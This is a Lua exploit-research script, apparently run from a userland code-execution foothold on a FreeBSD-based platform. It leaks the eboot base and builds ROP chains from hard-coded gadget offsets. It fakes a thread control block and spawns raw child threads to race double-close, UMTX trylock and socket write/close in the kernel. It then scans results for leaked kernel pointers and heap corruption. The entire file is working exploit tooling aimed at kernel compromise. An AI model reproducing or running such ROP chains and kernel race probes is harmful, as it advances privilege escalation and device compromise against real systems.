-- CRASH_CLASS: HIGH
-- PROBE 385a: Concurrent child thread races
--
-- Context: Child threads confirmed: thr_new(455) + ROP chain for 4-arg syscalls.
-- Kqueue close race was exhausted (271g-271i, 10K+ attempts, 0 anomalies).
-- This probe tests NEW race patterns using multiple simultaneous children:
--
--   [C] Double-close race: 2 children close same fd simultaneously
--       If not atomic, fd table entry freed twice → kernel heap corruption
--   [D] UMTX trylock race: 4 children trylock same futex word simultaneously
--       If fast path has TOCTOU, >1 might "succeed" → owner word corruption
--   [E] Socket sendto + close race: child A sends data while child B closes fd
--       If close wins mid-send, socket teardown races sofree()
--
-- After each race: scan sentinel regions for kernel pointers.

print("=== PROBE 385a: concurrent child races ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- [A] eboot + gadgets
print("")
print("[A] eboot + gadgets")
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi], rax; ret

-- Ignore SIGSEGV(11) + SIGSYS(12) for child crashes
local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))       -- SIG_IGN
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

-- Fake TCB: stub error handler accesses %fs:0 for errno.
-- Children without TLS crash on any failing syscall.
-- Fix: sysarch(SET_FSBASE=129) as first ROP op in every child.
local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
print("fake TCB ready")

if not alive() then print("DEAD after setup"); return end

-- Shared sysarch preamble emitter
local function emit_sysarch_preamble(emit_fn)
    emit_fn(g_pop_rdi);   emit_fn(uint64(129))          -- SET_FSBASE
    emit_fn(g_pop_rsi);   emit_fn(uint64(N(fs_ptr)))    -- &tcb_addr
    emit_fn(g_pop_rax);   emit_fn(uint64(165))          -- SYS_sysarch
    emit_fn(stub)
end

-- Helper: build a child that does one 1-arg syscall and saves result
-- With fake TCB preamble so error paths don't crash
local function make_child_1arg(syscall_no, rdi_val)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local raw_top = sb + ss
    local rsp = raw_top - (raw_top % 16) - 8

    local res = memory.alloc(8)
    wq(N(res), uint64(0xCCCCCCCC))

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- Phase 0: set FS base for error path safety
    emit_sysarch_preamble(emit)

    -- Phase 1: the actual syscall
    emit(g_pop_rdi);       emit(uint64(rdi_val))
    emit(g_pop_rax);       emit(uint64(syscall_no))
    emit(stub)
    emit(g_pop_rdi);       emit(uint64(N(res)))
    emit(g_mov_m_rax)
    emit(g_pop_rdi);       emit(uint64(0))
    emit(g_pop_rax);       emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))       -- arg unused (rdi set in chain)
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    return par, res, tid_ptr
end

-- Helper: build a child for UMTX trylock (3 args: addr, op=6, val=0)
local function make_child_umtx_trylock(futex_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local raw_top = sb + ss
    local rsp = raw_top - (raw_top % 16) - 8

    local res = memory.alloc(8)
    wq(N(res), uint64(0xCCCCCCCC))

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)

    emit(g_pop_rdi);       emit(uint64(futex_addr))
    emit(g_pop_rsi);       emit(uint64(6))           -- UMTX_OP_MUTEX_TRYLOCK
    emit(g_pop_rdx);       emit(uint64(0))
    emit(g_pop_rcx);       emit(uint64(0))
    emit(g_pop_rax);       emit(uint64(454))
    emit(stub)
    emit(g_pop_rdi);       emit(uint64(N(res)))
    emit(g_mov_m_rax)
    emit(g_pop_rdi);       emit(uint64(0))
    emit(g_pop_rax);       emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    return par, res, tid_ptr
end

local sc_thr_new = mk(455)
local sc_socket = mk(97)
local sc_close = mk(6)
local total_anomalies = 0

-- =====================================================================
-- [C] DOUBLE-CLOSE RACE
-- Two children close the same fd simultaneously
-- If fd table lock has a TOCTOU, both might call closef() → double free
-- =====================================================================
print("")
print("[C] double-close race (100 iterations)")

local close_anomalies = 0
local close_both_ok = 0
local close_both_fail = 0

for iter = 1, 100 do
    if not alive() then print("DEAD at double-close iter " .. iter); break end

    -- Create socket
    local ok_s, rv_s = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(0))  -- AF_INET SOCK_DGRAM
    end)
    local fd = ok_s and N(rv_s) or -1
    if fd < 0 then print("iter " .. iter .. ": socket fail"); break end

    -- Build two children that both close(fd)
    local par1, res1, tid1 = make_child_1arg(6, fd)  -- close(fd)
    local par2, res2, tid2 = make_child_1arg(6, fd)  -- close(fd)

    -- Spawn both as fast as possible
    pcall(function() sc_thr_new(par1, uint64(0x38)) end)
    pcall(function() sc_thr_new(par2, uint64(0x38)) end)

    -- Wait
    for w = 1, 5000 do local _ = rd(N(res1)) end

    -- Check results
    local r1 = rq(N(res1))
    local r2 = rq(N(res2))
    local r1h, r1l = get_hi_lo(r1)
    local r2h, r2l = get_hi_lo(r2)

    -- Normal: one returns 0 (closed), other returns -1 (already closed)
    local v1 = (r1h == 0xFFFFFFFF or r1h == -1) and -1 or r1l
    local v2 = (r2h == 0xFFFFFFFF or r2h == -1) and -1 or r2l

    if v1 == 0 and v2 == 0 then
        close_both_ok = close_both_ok + 1
        if close_both_ok <= 3 then
            print(string.format("  *** iter=%d BOTH RETURNED 0 — possible double-close ***", iter))
        end
    elseif v1 == -1 and v2 == -1 then
        close_both_fail = close_both_fail + 1
    end

    -- Check for kernel pointer in results
    if is_kptr(r1) then
        close_anomalies = close_anomalies + 1
        print(string.format("  *** iter=%d KPTR in res1: %s ***", iter, fmt(r1)))
    end
    if is_kptr(r2) then
        close_anomalies = close_anomalies + 1
        print(string.format("  *** iter=%d KPTR in res2: %s ***", iter, fmt(r2)))
    end

    if iter % 25 == 0 then
        collectgarbage("collect")
        print(string.format("  progress: %d/100  both_ok=%d both_fail=%d anom=%d",
            iter, close_both_ok, close_both_fail, close_anomalies))
    end
end

total_anomalies = total_anomalies + close_anomalies
print(string.format("  RESULT: both_ok=%d  both_fail=%d  anomalies=%d",
    close_both_ok, close_both_fail, close_anomalies))

if not alive() then print("DEAD after double-close"); return end

-- =====================================================================
-- [D] UMTX TRYLOCK RACE
-- 4 children all trylock the same futex word simultaneously
-- Expected: exactly 1 succeeds (ret=0), 3 fail (ret=-1 EBUSY)
-- Anomaly: >1 succeed, or futex word has unexpected value
-- =====================================================================
print("")
print("[D] UMTX trylock race (50 iterations × 4 children)")

local umtx_anomalies = 0
local umtx_multi_lock = 0
local umtx_zero_lock = 0

for iter = 1, 50 do
    if not alive() then print("DEAD at umtx iter " .. iter); break end

    -- Fresh futex word = 0 (unlocked)
    local futex = memory.alloc(8)
    local fa = N(futex)
    wq(fa, uint64(0))

    -- Sentinel area after futex (check for overwrite)
    wd(fa + 8, 0xAAAAAAAA)
    wd(fa + 12, 0xBBBBBBBB)

    -- Build 4 children
    local pars = {}
    local ress = {}
    local tids = {}
    for c = 1, 4 do
        local p, r, t = make_child_umtx_trylock(fa)
        pars[c] = p; ress[c] = r; tids[c] = t
    end

    -- Spawn all 4 as fast as possible
    for c = 1, 4 do
        pcall(function() sc_thr_new(pars[c], uint64(0x38)) end)
    end

    -- Wait
    for w = 1, 8000 do local _ = rd(fa) end

    -- Check results
    local successes = 0
    local results = {}
    for c = 1, 4 do
        local rv = rq(N(ress[c]))
        local h, l = get_hi_lo(rv)
        local v = (h == 0xFFFFFFFF or h == -1) and -1 or l
        results[c] = v
        if v == 0 then successes = successes + 1 end
        if is_kptr(rv) then
            umtx_anomalies = umtx_anomalies + 1
            print(string.format("  *** iter=%d child=%d KPTR: %s ***", iter, c, fmt(rv)))
        end
    end

    -- Check futex word
    local fval = rq(fa)
    local fh, fl = get_hi_lo(fval)

    -- Check sentinel
    local s1 = rd(fa + 8) or 0
    local s2 = rd(fa + 12) or 0

    if successes > 1 then
        umtx_multi_lock = umtx_multi_lock + 1
        print(string.format("  *** iter=%d MULTI-LOCK: %d children returned 0! futex=%s ***",
            iter, successes, fmt(fval)))
        print(string.format("    results: %d %d %d %d", results[1], results[2], results[3], results[4]))
    elseif successes == 0 then
        umtx_zero_lock = umtx_zero_lock + 1
        if umtx_zero_lock <= 2 then
            print(string.format("  iter=%d zero locks (all -1), futex=%s", iter, fmt(fval)))
        end
    end

    -- Kernel pointer in futex word?
    if is_kptr(fval) then
        umtx_anomalies = umtx_anomalies + 1
        print(string.format("  *** iter=%d KPTR IN FUTEX: %s ***", iter, fmt(fval)))
    end

    -- Sentinel corruption?
    if s1 ~= 0xAAAAAAAA or s2 ~= 0xBBBBBBBB then
        umtx_anomalies = umtx_anomalies + 1
        print(string.format("  *** iter=%d SENTINEL CORRUPT: %08X %08X ***", iter, s1, s2))
    end

    if iter % 10 == 0 then
        collectgarbage("collect")
        print(string.format("  progress: %d/50  multi=%d zero=%d anom=%d",
            iter, umtx_multi_lock, umtx_zero_lock, umtx_anomalies))
    end
end

total_anomalies = total_anomalies + umtx_anomalies
print(string.format("  RESULT: multi_lock=%d  zero_lock=%d  anomalies=%d",
    umtx_multi_lock, umtx_zero_lock, umtx_anomalies))

if not alive() then print("DEAD after umtx race"); return end

-- =====================================================================
-- [E] SOCKET WRITE + CLOSE RACE
-- Create socketpair. Child A writes 4KB to one end.
-- Child B closes that same fd. If close wins mid-sosend, the socket
-- buffer chain might reference freed memory.
-- Main thread reads from the other end to check for stale data.
-- =====================================================================
print("")
print("[E] socket write + close race (50 iterations)")

local sock_anomalies = 0
local sock_kptrs = 0

for iter = 1, 50 do
    if not alive() then print("DEAD at socket race iter " .. iter); break end

    -- Create socketpair
    local sv2 = memory.alloc(8)
    wd(N(sv2), 0); wd(N(sv2) + 4, 0)
    local ok2, rv2 = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), sv2)  -- AF_UNIX SOCK_DGRAM
    end)
    local sp2_ret = ok2 and N(rv2) or -999
    local s_rd = rd(N(sv2)) or -1
    local s_wr = rd(N(sv2) + 4) or -1
    if s_rd < 0 or s_wr < 0 then
        print("iter " .. iter .. ": socketpair fail")
        break
    end

    -- Prepare write buffer with sentinel pattern
    local wbuf = memory.alloc(256)
    for i = 0, 252, 4 do wd(N(wbuf) + i, 0x41414141 + iter) end

    -- Child A: write(s_wr, wbuf, 256)
    local stk_a = memory.alloc(0x4000)
    local sb_a = N(stk_a)
    local ss_a = 0x2000
    local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8

    local res_a = memory.alloc(8)
    wq(N(res_a), uint64(0xCCCCCCCC))

    local off_a = 0
    local function emit_a(v) wq(rsp_a + off_a, v); off_a = off_a + 8 end

    -- sysarch preamble for error safety
    emit_sysarch_preamble(emit_a)

    -- write(s_wr, wbuf, 256)
    emit_a(g_pop_rdi);     emit_a(uint64(s_wr))
    emit_a(g_pop_rsi);     emit_a(uint64(N(wbuf)))
    emit_a(g_pop_rdx);     emit_a(uint64(256))
    emit_a(g_pop_rax);     emit_a(uint64(4))     -- SYS_write
    emit_a(stub)
    emit_a(g_pop_rdi);     emit_a(uint64(N(res_a)))
    emit_a(g_mov_m_rax)
    emit_a(g_pop_rdi);     emit_a(uint64(0))
    emit_a(g_pop_rax);     emit_a(uint64(431))
    emit_a(stub)

    local par_a = memory.alloc(0x40)
    local pa_a = N(par_a)
    for i = 0, 0x3C, 4 do wd(pa_a + i, 0) end
    wq(pa_a + 0x00, g_bare_ret)
    wq(pa_a + 0x08, uint64(0))         -- arg unused (rdi set in chain)
    wq(pa_a + 0x10, uint64(sb_a))
    wq(pa_a + 0x18, uint64(ss_a))
    local tid_a = memory.alloc(8); wq(N(tid_a), uint64(0))
    wq(pa_a + 0x30, tid_a)

    -- Child B: close(s_wr)
    local par_b, res_b, tid_b = make_child_1arg(6, s_wr)

    -- RACE: spawn writer first, closer immediately after
    pcall(function() sc_thr_new(par_a, uint64(0x38)) end)
    pcall(function() sc_thr_new(par_b, uint64(0x38)) end)

    -- Wait
    for w = 1, 5000 do local _ = rd(N(res_a)) end

    -- Try to read from the other end
    local rbuf = memory.alloc(512)
    for i = 0, 508, 4 do wd(N(rbuf) + i, 0xDEADDEAD) end

    -- Set non-blocking on read fd, then read
    local ok_nb, _ = pcall(function()
        local nb = memory.alloc(4)
        wd(N(nb), 1)
        mk(54)(uint64(s_rd), uint64(0x8004667E), nb)  -- FIONBIO = 0x8004667E
    end)

    local ok_rd, rv_rd = pcall(function()
        return mk(3)(uint64(s_rd), rbuf, uint64(512))
    end)
    local nread = ok_rd and N(rv_rd) or -999

    -- Scan read buffer for kernel pointers
    if nread > 0 then
        for i = 0, math.min(nread, 504), 4 do
            local qv = rq(N(rbuf) + i)
            if is_kptr(qv) then
                sock_kptrs = sock_kptrs + 1
                print(string.format("  *** iter=%d KPTR in recv at +%d: %s ***", iter, i, fmt(qv)))
            end
        end
    end

    -- Check return values for anomalies
    local ra = rq(N(res_a))
    local rb = rq(N(res_b))
    if is_kptr(ra) then
        sock_anomalies = sock_anomalies + 1
        print(string.format("  *** iter=%d KPTR in write result: %s ***", iter, fmt(ra)))
    end
    if is_kptr(rb) then
        sock_anomalies = sock_anomalies + 1
        print(string.format("  *** iter=%d KPTR in close result: %s ***", iter, fmt(rb)))
    end

    -- Cleanup
    pcall(function() sc_close(uint64(s_rd)) end)
    pcall(function() sc_close(uint64(s_wr)) end)

    if iter % 10 == 0 then
        collectgarbage("collect")
        print(string.format("  progress: %d/50  kptrs=%d anom=%d",
            iter, sock_kptrs, sock_anomalies))
    end
end

total_anomalies = total_anomalies + sock_anomalies + sock_kptrs
print(string.format("  RESULT: kptrs=%d  anomalies=%d", sock_kptrs, sock_anomalies))

-- [F] Summary
print("")
print("[F] SUMMARY:")
print(string.format("  total anomalies: %d", total_anomalies))
if total_anomalies == 0 then
    print("  all race patterns: CLEAN (no kptrs, no corruption)")
else
    print("  *** ANOMALIES DETECTED — investigate above ***")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 385a COMPLETE ===")
